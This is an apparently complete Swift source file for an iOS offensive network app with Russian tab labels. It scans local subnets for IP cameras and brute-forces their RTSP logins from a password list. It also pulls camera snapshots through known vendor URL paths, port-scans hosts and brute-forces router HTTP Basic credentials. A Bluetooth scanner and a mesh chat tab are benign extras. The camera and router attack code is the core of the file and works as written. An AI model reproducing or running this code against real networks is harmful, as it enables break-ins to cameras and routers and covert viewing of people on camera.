import SwiftUI
import Network
import CoreBluetooth
import MultipeerConnectivity
import UIKit

// MARK: - Models
struct Credential { let user: String; let pass: String }
struct CameraHit: Identifiable { let id = UUID(); let ip: String; let url: String; let snapshotURL: String? }

// MARK: - NetworkTool
final class NetworkTool: ObservableObject {
    @Published var logs = ""
    @Published var isScanning = false
    @Published var progress: Double = 0
    @Published var hits: [CameraHit] = []
    @Published var lastSnapshot: UIImage? = nil
    @Published var lastSnapshotIP: String = ""
    @Published var loadedCount: Int = 0

    private var credentials: [Credential] = []

    init() { loadWordlist() }

    func loadWordlist() {
        var fallback: [Credential] = [
            Credential(user: "admin", pass: "admin"),
            Credential(user: "admin", pass: "12345"),
            Credential(user: "admin", pass: "password"),
            Credential(user: "root", pass: "root"),
        ]
        guard let path = Bundle.main.path(forResource: "passwords", ofType: "txt"),
              let content = try? String(contentsOfFile: path, encoding: .utf8) else {
            credentials = fallback
            loadedCount = fallback.count
            log("[!] passwords.txt not in bundle, using \(fallback.count) fallback.")
            return
        }
        var list: [Credential] = []
        for rawLine in content.components(separatedBy: .newlines) {
            let line = rawLine.trimmingCharacters(in: .whitespaces)
            if line.isEmpty || line.hasPrefix("#") { continue }
            if let idx = line.firstIndex(of: ":") {
                let u = String(line[..<idx])
                let p = String(line[line.index(after: idx)...])
                if !u.isEmpty { list.append(Credential(user: u, pass: p)) }
            }
        }
        if list.isEmpty { list = fallback }
        credentials = list
        loadedCount = list.count
        log("[*] Loaded \(list.count) creds from passwords.txt.")
    }

    func log(_ t: String) { DispatchQueue.main.async { self.logs += t + "\n" } }
    func clear() { logs = ""; hits = []; lastSnapshot = nil }

    func startCameraScan(ipRange: String) {
        isScanning = true; clear()
        Task {
            for i in 1...254 {
                let ip = "\(ipRange).\(i)"
                if await checkPort(host: ip, port: 554) {
                    log("[+] \(ip) RTSP open")
                    await bruteRTSP(ip: ip)
                }
                if await checkPort(host: ip, port: 80) {
                    await trySnapshot(ip: ip)
                }
                DispatchQueue.main.async { self.progress = Double(i) / 254.0 }
                try? await Task.sleep(nanoseconds: 200_000_000)
            }
            DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[*] Camera scan done.") }
        }
    }

    func startPortScan(ip: String) {
        isScanning = true; clear()
        let ports: [UInt16] = [21,22,23,25,53,80,110,135,139,143,443,445,554,1433,1521,3306,3389,5432,5900,6379,8080,8443,8554,8888,9100]
        Task {
            var idx = 0
            for p in ports {
                if await checkPort(host: ip, port: p) { log("[+] \(ip):\(p) open") }
                idx += 1
                DispatchQueue.main.async { self.progress = Double(idx) / Double(ports.count) }
            }
            DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[*] Ports done.") }
        }
    }

    func startWifiBrute(gateway: String) {
        isScanning = true; clear()
        Task {
            var idx = 0
            for cred in credentials {
                if await tryHTTPBasic(ip: gateway, user: cred.user, pass: cred.pass) {
                    log("[!!!] Router: \(cred.user):\(cred.pass)")
                    DispatchQueue.main.async { self.hits.append(CameraHit(ip: gateway, url: "http://\(gateway)", snapshotURL: nil)) }
                    try? await Task.sleep(nanoseconds: 500_000_000)
                }
                idx += 1
                DispatchQueue.main.async { self.progress = Double(idx) / Double(self.credentials.count) }
                try? await Task.sleep(nanoseconds: 300_000_000)
            }
            DispatchQueue.main.async { self.isScanning = false; self.progress = 0; self.log("[*] WiFi brute done.") }
        }
    }

    func checkPort(host: String, port: UInt16) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(host), port: .init(rawValue: port)!, using: .tcp)
            var done = false
            conn.stateUpdateHandler = { s in
                if case .ready = s, !done { done = true; cont.resume(returning: true); conn.cancel() }
                else if case .failed = s, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.7) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }

    func bruteRTSP(ip: String) async {
        for cred in credentials {
            if let url = await tryRTSP(ip: ip, user: cred.user, pass: cred.pass) {
                log("[!!!] RTSP: \(url)")
                DispatchQueue.main.async { self.hits.append(CameraHit(ip: ip, url: url, snapshotURL: nil)) }
                try? await Task.sleep(nanoseconds: 1_000_000_000)
                return
            }
            try? await Task.sleep(nanoseconds: 250_000_000)
        }
        log("[-] \(ip) no RTSP cred.")
    }

    func tryRTSP(ip: String, user: String, pass: String) async -> String? {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 554, using: .tcp)
            var done = false
            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "DESCRIBE rtsp://\(ip):554/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: CamSweep/3.0\r\nAuthorization: Basic \(auth)\r\n\r\n"
            conn.stateUpdateHandler = { s in
                if case .ready = s {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 2048) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let data = data, let str = String(data: data, encoding: .utf8), str.contains("200 OK") {
                                cont.resume(returning: "rtsp://\(user):\(pass)@\(ip)"); return
                            }
                            cont.resume(returning: nil)
                        }
                    })
                } else if case .failed = s, !done { done = true; cont.resume(returning: nil) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: nil) }
            }
        }
    }

    func trySnapshot(ip: String) async {
        let paths = ["/snapshot.jpg", "/jpg/image.jpg", "/image/jpeg.cgi", "/cgi-bin/snapshot.cgi", "/onvif/snapshot", "/ISAPI/Streaming/channels/101/picture"]
        for path in paths {
            if let img = await fetchHTTPImage(ip: ip, path: path) {
                log("[+] snapshot \(ip)\(path)")
                DispatchQueue.main.async {
                    self.lastSnapshot = img
                    self.lastSnapshotIP = ip
                    self.hits.append(CameraHit(ip: ip, url: "http://\(ip)\(path)", snapshotURL: "http://\(ip)\(path)"))
                }
                return
            }
        }
    }

    func fetchHTTPImage(ip: String, path: String) async -> UIImage? {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 80, using: .tcp)
            var done = false
            let req = "GET \(path) HTTP/1.1\r\nHost: \(ip)\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
            conn.stateUpdateHandler = { s in
                if case .ready = s {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 65536) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let data = data, let img = UIImage(data: data) {
                                cont.resume(returning: img); return
                            }
                            cont.resume(returning: nil)
                        }
                    })
                } else if case .failed = s, !done { done = true; cont.resume(returning: nil) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: nil) }
            }
        }
    }

    func tryHTTPBasic(ip: String, user: String, pass: String) async -> Bool {
        return await withCheckedContinuation { cont in
            let conn = NWConnection(host: .init(ip), port: 80, using: .tcp)
            var done = false
            let auth = "\(user):\(pass)".data(using: .utf8)!.base64EncodedString()
            let req = "GET / HTTP/1.1\r\nHost: \(ip)\r\nUser-Agent: Mozilla/5.0\r\nAuthorization: Basic \(auth)\r\nConnection: close\r\n\r\n"
            conn.stateUpdateHandler = { s in
                if case .ready = s {
                    conn.send(content: req.data(using: .utf8), completion: .contentProcessed { _ in
                        conn.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                            defer { if !done { done = true; conn.cancel() } }
                            if let data = data, let str = String(data: data, encoding: .utf8), str.contains("200") {
                                cont.resume(returning: true); return
                            }
                            cont.resume(returning: false)
                        }
                    })
                } else if case .failed = s, !done { done = true; cont.resume(returning: false) }
            }
            conn.start(queue: .global())
            DispatchQueue.global().asyncAfter(deadline: .now() + 1.5) {
                if !done { done = true; conn.cancel(); cont.resume(returning: false) }
            }
        }
    }
}

// MARK: - BLETool
final class BLETool: NSObject, ObservableObject, CBCentralManagerDelegate {
    @Published var devices: [(String, Int)] = []
    @Published var isOn = false
    private var central: CBCentralManager!

    override init() { super.init(); central = CBCentralManager(delegate: self, queue: .global()) }

    func centralManagerDidUpdateState(_ central: CBCentralManager) {
        DispatchQueue.main.async { self.isOn = central.state == .poweredOn }
        if central.state == .poweredOn {
            central.scanForPeripherals(withServices: nil, options: [CBCentralManagerScanOptionAllowDuplicatesKey: false])
        }
    }

    func centralManager(_ central: CBCentralManager, didDiscover p: CBPeripheral, advertisementData: [String: Any], rssi RSSI: NSNumber) {
        let name = p.name ?? "unknown"
        DispatchQueue.main.async {
            if let idx = self.devices.firstIndex(where: { $0.0 == name }) {
                self.devices[idx] = (name, RSSI.intValue)
            } else {
                self.devices.append((name, RSSI.intValue))
            }
        }
    }
}

// MARK: - ChatTool
final class ChatTool: NSObject, ObservableObject, MCSessionDelegate, MCNearbyServiceAdvertiserDelegate, MCNearbyServiceBrowserDelegate {
    @Published var messages: [String] = []
    @Published var peers: Int = 0
    private var session: MCSession!
    private var advertiser: MCNearbyServiceAdvertiser!
    private var browser: MCNearbyServiceBrowser!

    override init() {
        super.init()
        session = MCSession(peer: MCPeerID(displayName: UIDevice.current.name), securityIdentity: nil, encryptionPreference: .required)
        session.delegate = self
        advertiser = MCNearbyServiceAdvertiser(peer: session.myPeerID, discoveryInfo: nil, serviceType: "dolphy-chat")
        advertiser.delegate = self
        advertiser.startAdvertisingPeer()
        browser = MCNearbyServiceBrowser(peer: session.myPeerID, serviceType: "dolphy-chat")
        browser.delegate = self
        browser.startBrowsingForPeers()
    }

    func send(_ text: String) {
        guard !session.connectedPeers.isEmpty else { return }
        if let data = text.data(using: .utf8) { try? session.send(data, toPeers: session.connectedPeers, with: .reliable) }
        messages.append("[me] \(text)")
    }

    func session(_ session: MCSession, didReceive data: Data, fromPeer peerID: MCPeerID) {
        if let t = String(data: data, encoding: .utf8) { DispatchQueue.main.async { self.messages.append("[\(peerID.displayName)] \(t)") } }
    }
    func session(_ session: MCSession, peer peerID: MCPeerID, didChange state: MCSessionState) {
        DispatchQueue.main.async { self.peers = session.connectedPeers.count }
    }
    func session(_ session: MCSession, didReceive stream: InputStream, withName streamName: String, fromPeer peerID: MCPeerID) {}
    func session(_ session: MCSession, didStartReceivingResourceWithName resourceName: String, fromPeer peerID: MCPeerID, with progress: Progress) {}
    func session(_ session: MCSession, didFinishReceivingResourceWithName resourceName: String, fromPeer peerID: MCPeerID, at localURL: URL?, withError error: Error?) {}
    func advertiser(_ advertiser: MCNearbyServiceAdvertiser, didReceiveInvitationFromPeer peerID: MCPeerID, withContext context: Data?, invitationHandler: @escaping (Bool, MCSession?) -> Void) { invitationHandler(true, session) }
    func browser(_ browser: MCNearbyServiceBrowser, foundPeer peerID: MCPeerID, withDiscoveryInfo info: [String : String]?) { browser.invitePeer(peerID, to: session, withContext: nil, timeout: 10) }
    func browser(_ browser: MCNearbyServiceBrowser, lostPeer peerID: MCPeerID) {}
}

// MARK: - IRTool stub
final class IRTool: ObservableObject {
    @Published var logs = "[*] IR stub. USB-C dongle required."
}

// MARK: - ContentView
struct ContentView: View {
    @StateObject var net = NetworkTool()
    @StateObject var ble = BLETool()
    @StateObject var chat = ChatTool()
    @StateObject var ir = IRTool()

    @State private var subnet = "192.168.1"
    @State private var targetIP = "192.168.1.1"
    @State private var gateway = "192.168.1.1"

    var body: some View {
        TabView {
            CamerasTab(net: net, subnet: $subnet)
                .tabItem { Label("Камеры", systemImage: "camera") }
            PortsTab(net: net, targetIP: $targetIP)
                .tabItem { Label("Порты", systemImage: "network") }
            WifiTab(net: net, gateway: $gateway)
                .tabItem { Label("WiFi", systemImage: "wifi") }
            RadioTab(ble: ble, ir: ir)
                .tabItem { Label("Radio", systemImage: "antenna.radiowaves.left.and.right") }
            ChatTab(chat: chat)
                .tabItem { Label("Чат", systemImage: "bubble.left.and.bubble.right") }
        }
        .preferredColorScheme(.dark)
    }
}

// MARK: - Tabs
struct CamerasTab: View {
    @ObservedObject var net: NetworkTool
    @Binding var subnet: String
    var body: some View {
        NavigationView {
            VStack(spacing: 8) {
                HStack {
                    TextField("subnet", text: $subnet)
                        .textFieldStyle(.roundedBorder)
                        .keyboardType(.numbersAndPunctuation)
                        .font(.system(.body, design: .monospaced))
                    Button("Scan") { net.startCameraScan(ipRange: subnet) }
                        .disabled(net.isScanning)
                }.padding(.horizontal)

                Text("Creds: \(net.loadedCount)")
                    .font(.system(.caption, design: .monospaced))
                    .foregroundColor(.secondary)

                if net.progress > 0 { ProgressView(value: net.progress).padding(.horizontal) }

                if let img = net.lastSnapshot {
                    VStack {
                        Image(uiImage: img)
                            .resizable()
                            .scaledToFit()
                            .frame(maxHeight: 200)
                            .cornerRadius(8)
                        Text("Snapshot: \(net.lastSnapshotIP)")
                            .font(.system(.caption, design: .monospaced))
                            .foregroundColor(.secondary)
                    }.padding(.horizontal)
                }

                ScrollView {
                    Text(net.logs)
                        .font(.system(.footnote, design: .monospaced))
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .padding()
                }
            }.navigationTitle("Cam Catch")
        }
    }
}

struct PortsTab: View {
    @ObservedObject var net: NetworkTool
    @Binding var targetIP: String
    var body: some View {
        NavigationView {
            VStack {
                HStack {
                    TextField("ip", text: $targetIP)
                        .textFieldStyle(.roundedBorder)
                        .keyboardType(.numbersAndPunctuation)
                        .font(.system(.body, design: .monospaced))
                    Button("Scan") { net.startPortScan(ip: targetIP) }.disabled(net.isScanning)
                }.padding()
                if net.progress > 0 { ProgressView(value: net.progress).padding(.horizontal) }
                ScrollView {
                    Text(net.logs).font(.system(.footnote, design: .monospaced))
                        .frame(maxWidth: .infinity, alignment: .leading).padding()
                }
            }.navigationTitle("Ports")
        }
    }
}

struct WifiTab: View {
    @ObservedObject var net: NetworkTool
    @Binding var gateway: String
    var body: some View {
        NavigationView {
            VStack {
                Text("Router brute (HTTP Basic)").font(.system(.caption)).foregroundColor(.secondary)
                Text("Creds: \(net.loadedCount)").font(.system(.caption, design: .monospaced)).foregroundColor(.secondary)
                HStack {
                    TextField("gateway", text: $gateway)
                        .textFieldStyle(.roundedBorder)
                        .keyboardType(.numbersAndPunctuation)
                        .font(.system(.body, design: .monospaced))
                    Button("Brute") { net.startWifiBrute(gateway: gateway) }.disabled(net.isScanning)
                }.padding()
                if net.progress > 0 { ProgressView(value: net.progress).padding(.horizontal) }
                ScrollView {
                    Text(net.logs).font(.system(.footnote, design: .monospaced))
                        .frame(maxWidth: .infinity, alignment: .leading).padding()
                }
            }.navigationTitle("WiFi Brute")
        }
    }
}

struct RadioTab: View {
    @ObservedObject var ble: BLETool
    @ObservedObject var ir: IRTool
    var body: some View {
        NavigationView {
            List {
                Section("BLE Scanner") {
                    if !ble.isOn { Text("Bluetooth off").foregroundColor(.red) }
                    ForEach(ble.devices.indices, id: \.self) { i in
                        HStack {
                            Text(ble.devices[i].0).font(.system(.body, design: .monospaced))
                            Spacer()
                            Text("\(ble.devices[i].1) dBm").font(.system(.footnote, design: .monospaced))
                        }
                    }
                }
                Section("IR") {
                    Text(ir.logs).font(.system(.footnote, design: .monospaced))
                }
            }.navigationTitle("Radio")
        }
    }
}

struct ChatTab: View {
    @ObservedObject var chat: ChatTool
    @State private var text = ""
    var body: some View {
        NavigationView {
            VStack {
                Text("Peers: \(chat.peers)").font(.system(.caption)).padding(.top)
                ScrollView {
                    ForEach(chat.messages, id: \.self) { m in
                        Text(m).font(.system(.footnote, design: .monospaced))
                            .frame(maxWidth: .infinity, alignment: .leading).padding(.horizontal)
                    }
                }
                HStack {
                    TextField("msg", text: $text).textFieldStyle(.roundedBorder).font(.system(.body, design: .monospaced))
                    Button("Send") { chat.send(text); text = "" }
                }.padding()
            }.navigationTitle("Mesh Chat")
        }
    }
}
